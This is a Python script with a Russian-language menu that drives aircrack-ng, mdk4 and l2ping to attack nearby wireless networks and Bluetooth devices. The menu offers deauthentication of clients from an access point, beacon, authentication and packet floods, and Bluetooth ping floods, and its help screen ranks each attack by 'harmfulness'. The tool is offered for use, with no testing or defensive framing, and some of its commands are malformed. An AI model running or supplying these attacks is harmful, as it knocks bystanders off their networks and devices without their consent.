from time import sleep
import os
from colorama import init, Fore, Back, Style
import subprocess

init()

def as1w():
	sleep(1)
	os.system("clear")
	print (Fore.CYAN)
	sleep(1)
	print("""							╭╮╭╮╭╮  ╭━━━╮  ╭━━━╮  ╭━╮╭━╮
							┃┃┃┃┃┃╱╱┃╭━╮┃╱╱┃╭━╮┃╱╱┃┃╰╯┃┃
							┃┃┃┃┃┃╱╱┃┃╱╰╯╱╱┃┃╱┃┃╱╱┃╭╮╭╮┃
							┃╰╯╰╯┃╱╱┃┃╱╭╮╱╱┃╰━╯┃╱╱┃┃┃┃┃┃
							╰╮╭╮╭╯╭╮┃╰━╯┃╭╮┃╭━╮┃╭╮┃┃┃┃┃┃
							 ╰╯╰╯ ╰╯╰━━━╯╰╯╰╯ ╰╯╰╯╰╯╰╯╰╯""")
	print (Fore.RESET)
	sleep(1.4)

asss = input(Fore.RESET+": ")
print ("")
ass = asss.replace(' ', '')

if ass == "0":
	as1w()
	sleep(1)
	os.system("clear")
	os.system("sudo apt install aircrack-ng -y")
	os.system("clear")
	os.system("sudo apt install mdk4 -y")
	os.system("clear")
	os.system("sudo apt install xterm -y")
	sleep(1)
	print(Fore.RED+"[*]"+Fore.RESET+" Готово!")
	sleep(1)
	os.system("python3 modes.py")

elif ass == "1":
	as1w()
	sleep(1)
	gS0 = input(Fore.RED+"[*]"+Fore.RESET+" BSSID точки доступа: ")
	sleep(1)
	gS1 = input(str(Fore.RED+"[*]"+Fore.RESET+" Канал точки доступа: "))
	sleep(1)
	gS2 = input(Fore.RED+"[*]"+Fore.RESET+" Количество отправляемых пакетов: ")
	sleep(1)
	gS3 = input(Fore.RED+"[*]"+Fore.RESET+" Отключаем кого-то конкретного от т.д?\n(Y/n)\n:")
	sleep(1)
	
	S0 = gS0.replace(' ', '')
	S1 = gS1.replace(' ', '')
	S2 = gS2.replace(' ', '')
	S3 = gS3.replace(' ', '')
	
	if S3 == "y":
		sleep(1)
		gS4 = input(Fore.RED+"[*]"+Fore.RESET+" BSSID пользвоателя: ")
		S4 = gS4.replace(' ', '')
		sleep(1)
		print(Fore.RED+"[К]"+Fore.RESET+" После открытия airodump-ng советуется закрыть окно")
		sleep(1)
		os.system("sudo xterm -e airodump-ng wlp1s0mon --channel "+S1)
		print("")
		os.system("sudo xterm -e aireplay-ng -0 "+S2+" -a "+S0+" wlp1s0mon")
		sleep(1)
		os.system("python3 modes.py")
	if S3 == "Y":
		sleep(1)
		gS4 = input(Fore.RED+"[*]"+Fore.RESET+" BSSID пользвоателя: ")
		S4 = gS4.replace(' ', '')
		sleep(1)
		print(Fore.RED+"[К]"+Fore.RESET+" После открытия airodump-ng советуется закрыть окно")
		sleep(1)
		os.system("sudo xterm -e airodump-ng wlp1s0mon --channel "+S1)
		print("")
		os.system("sudo xterm -e aireplay-ng -0 "+S2+" -a "+S0+" --channel"+S4+" wlp1s0mon")
		sleep(1)
		os.system("python3 modes.py")
	if S3 == "N":
		sleep(1)
		print(Fore.RED+"[К]"+Fore.RESET+" После открытия airodump-ng советуется закрыть окно")
		sleep(1)
		os.system("sudo xterm -e airodump-ng wlp1s0mon --channel"+S1)
		print("")
		sleep(1)
		os.system("sudo xterm -e aireplay-ng -0 "+S2+" -a "+S0+" wlp1s0mon")
		sleep(1)
		os.system("python3 modes.py")
	if S3 == "n":
		sleep(1)
		print(Fore.RED+"[К]"+Fore.RESET+" После открытия airodump-ng советуется закрыть окно")
		sleep(1)
		os.system("sudo xterm -e airodump-ng wlp1s0mon --channel "+S1)
		print("")
		sleep(1)
		os.system("sudo xterm -e aireplay-ng -0 "+S2+" -a "+S0+" wlp1s0mon")
		sleep(1)
		os.system("python3 modes.py")

elif ass == "2":
	as1w()
	sleep(1)
	print (Fore.RED+"[*]"+Fore.RESET+" Создание точки доступа...")
	sleep(1)
	print (Fore.RED+"[*]"+Fore.RESET+" Для остановки процесса закроёте окно ")
	sleep(3)
	os.system("sudo xterm -e mdk4 wlp1s0mon b -ams 500")
	sleep(1)
	os.system ("python3 modes.py")

elif ass == "3":
	as1w()
	sleep(1)
	ao1 = input(Fore.RED+"[*]"+Fore.RESET+" BSSID точки доступа: ")
	o1 = ao1.replace(' ', '')
	sleep(1)
	os.system("sudo xterm -e mdk4 wlp1s0mon a -a "+o1)
	sleep(1)
	os.system("python3 modes.py")

elif ass == "4":
	as1w()
	sleep(1)
	print("Отправляю пакеты в эфир...")
	os.system("sudo xterm -e mdk4 wlp1s0mon f -sap -m bmstm -p 400")
	os.system("python3 modes.py")

elif ass == "5":
	as1w()
	os.system("sudo systemctl start bluetooth")
	sleep(1)
	wfs = input(str(Fore.RED+"[*]"+Fore.RESET+" BSSID блютуз устройства: "))
	sleep(1)
	ws = wfs.replace(' ', '')
	os.system("sudo xterm -e l2ping -i hci0 -f "+ws)
	sleep(1)
	os.system("sudo systemctl stop bluetooth")
	os.system("python3 modes.py")

elif ass == "6":
	as1w()
	sleep(1)
	print(Fore.RED+"[*]"+Fore.RESET+" Перевожу твой адаптер в режим мониторинга...")
	sleep(1)
	os.system("sudo xterm -e airmon-ng start wlp1s0")
	sleep(1)
	os.system("python3 modes.py")

elif ass == "7":
	as1w()
	sleep(1)
	print(Fore.RED+"[*]"+Fore.RESET+" Вывожу твой адаптер из режима мониторинга...")
	sleep(1)
	os.system("sudo xterm -e airmon-ng stop wlp1s0mon")
	sleep(1)
	os.system("python3 modes.py")

elif ass == "8":
	as1w()
	sleep(1)
	print(Fore.RED+"[*]"+Fore.RESET+" Произвожу захват и обработку пакетов...")
	sleep(1)
	os.system("sudo xterm -e airodump-ng wlp1s0mon")
	sleep(1)
	os.system("python3 modes.py")

elif ass == "9":
	os.system("sudo systemctl start bluetooth")
	as1w()
	sleep(1)
	print(Fore.RED+"[*]"+Fore.RESET+" Произвожу захват блютуз пакетов...")
	sleep(1)
	os.system("sudo xterm -e hcitool scan")
	sleep(1)
	os.system("sudo systemctl stop bluetooth")
	os.system("python3 modes.py")

elif ass == "10":
	as1w()
	sleep(0.4)
	sfs012 = input(Fore.RED+"[*]"+Fore.RESET+" Вы уверенны что хотите выйти? Y/n\n:")
	sfs2 = sfs012.replace(' ', '')
	if sfs2 == "y":
		os.system("clear")
		print(Fore.RED+"[*]"+Fore.RESET+" Пока!")
		sleep(0.4)
		exit(0)
	if sfs2 == "N":
		sleep(1)
		os.system("python3 modes.py")
	if sfs2 == "Y":
		os.system("clear")
		print(Fore.RED+"[*]"+Fore.RESET+" Пока!")
		sleep(0.4)
		exit(0)
	if sfs2 == "n":
		sleep(1)
		os.system("python3 modes.py")

elif ass == "88":
	as1w()
	sleep(1)
	print(Fore.YELLOW)
	print("""

Шкала вредоносности - ШВ (1-10)

[0] Установка комплектующих: Установка требуемых для скрипта пакетов. (ШВ - 2)
	
[1] Атака D: Отправляет фреймы деаутентификации на основе трафика данных для отключения всех клиентов от ТД. (ШВ - 11)
	
[2] Атака B: Создаёт видимость присутствия множества точек доступа. Это иногда может вывести из строя сканеры сети, драйвера \nи сильно поднять пинги всем ТД в округе! (ШВ - 5)
	
[3] Атака A: Отправляет фреймы аутентификации точке доступа в диапазоне доступности. Слишком много клиентов может привести \nк повышению пинга, зависанию или перезагрузке ТД. (ШВ - 7)
	
[4] Атака F: Захватывает случайный пакет из эфира и изменяет его таким образом что при выглядит он как - \"Внимание! \n(информация) от всех для всех\". Все ТД в округепытается обработать этот пакет, из-за чего вырастают пинги и Вай-фай падает. (ШВ - 10)

[5] Атака L: Отправляет большое количество пакетов на блютуз устройство в радиусе доступности. За счёт этого появляются\n сильные и не очень помехи. (ШВ -7)

[6] Активный режим: Переводит ваш сетевой адаптер из обычного состояния в режима монитора, открывая многие возможности\nи отбирая некоторые повседневные. (ШВ - 0)
	
[7] Спокойный режим: Переводит ваш сетевой адаптер из режима монитора в обычное состояние, возвращая возможность использовать беспроводную\nили проводную сети. (ШВ - 0)
	
[8] Захват всех пакетов: Производит сбор и расшифровку пакетов точек доступа получая основную информацию как: мак адрес, название сети,\nканал точки доступа. Есть ли пароль у неё и т.д. (ШВ - 1)
	
[9] Захват пакетов блютуз: Производит сбор блютуз пакетов получая основную информацию как: мак адрес, название блютуз устройства. (ШВ - 0)
	
[10] Выход: Просто выход. (ШВ - 0)
	""")
	assw2 = input(Fore.RED+"[99] Назад\n: ")
	if assw2 == "99":
		sleep(1)
		os.system("python3 modes.py")
	else:
		print("Ваш ответ был растолкован как \"99\"")
		os.system("python3 modes.py")

elif ass == "mo4ki":
	as1w()
	sleep(1)
	print("Пасхалочкииии")

elif ass == "FSystem88":
	as1w()
	sleep(1)
	print(Fore.YELLOW)
	print("Мини история: Был один человек и звали его FSystem88 и создал он спамер божеский.\n")
	sleep(3)
	print("И сделал я видео про установку этого спамера и написал я этому человеку в лс в телеграме.\n")
	sleep(3)
	print("И спросил я разрешения на счёт видео о спамере моём и дал он разрешение своё.\n")
	sleep(3)
	print("И выложил я видео своё на ютуб канал свой и набрало виде моё дох*я просмотров.\n")
	sleep(3)
	print("И решил я сделать пародию на спамер его и выложил её на гитхаб свой.\n")
	sleep(3)
	print("И написал FSystem88 в телеграм мой и сказал он что эти действия - это статья.\n")
	sleep(3)
	print("И удалил я породию свою с гитхаба моего и извинился перед человеком тем.\n")
	sleep(3)
	print("И сказал я что хотел так python изучить, а он в ответ то, что так-же делал.\n")
	sleep(3)
	print("И сказал он мне, что учить python правельней через синтаксис.\n")
	sleep(3)
	print("И прислушался я совета его и благодарен я сейчас человеку этому.\n")
	sleep(3)
	print("Вот такая очень интересная история произошла со мной.\n")
	print(Fore.RESET)

else:
	sleep(0.4)
	print('Нет такого пункта')
	sleep(0.7)
	os.system("python3 modes.py")